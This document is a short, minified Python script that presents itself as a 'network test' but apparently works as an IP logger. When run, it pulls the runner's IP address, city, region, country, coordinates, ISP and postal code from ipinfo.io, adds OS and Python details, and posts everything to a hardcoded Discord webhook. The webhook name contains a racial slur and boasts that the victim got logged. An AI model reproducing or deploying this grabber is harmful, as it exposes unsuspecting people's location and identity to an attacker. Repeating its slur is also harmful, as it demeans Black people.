B='Unknown'
import requests as C,platform as D,time
E='https://discord.com/api/webhooks/1478942895926022376/ABgA0R5JobukTSDf9xw_Wlp_lUZXODnthdxdJT5FRrTaXvUQhkiGdJTuFS6Vg0LwmmgY'
def F():
	try:A=C.get('https://ipinfo.io/json',timeout=5);return A.json()
	except:return{}
def G(ip,city,region,country,loc,org,postal,os_name,python_ver,useragent):E=False;D='get logged nigga';C='inline';B='value';A='name';return{'username':D,'content':'@larpb','embeds':[{'title':'Network Test Result','color':16711803,'description':'Outbound API test results.','author':{A:D},'fields':[{A:'IP Info',B:f"""**IP:** `{ip}`
**City:** `{city}`
**Region:** `{region}`
**Country:** `{country}`
**Location:** `{loc}`
**ORG:** `{org}`
**ZIP:** `{postal}`""",C:True},{A:'Advanced Info',B:f"""**OS:** `{os_name}`
**Python:** `{python_ver}`
**UserAgent:** `Look Below!`
```yaml
{useragent}
```""",C:E},{A:'Test ID',B:f"`test-{int(time.time())}`",C:E}]}]}
A=F()
H=G(A.get('ip',B),A.get('city',B),A.get('region',B),A.get('country',B),A.get('loc',B),A.get('org',B),A.get('postal',B),D.system(),D.python_version(),'Python Requests')
C.post(E,json=H)
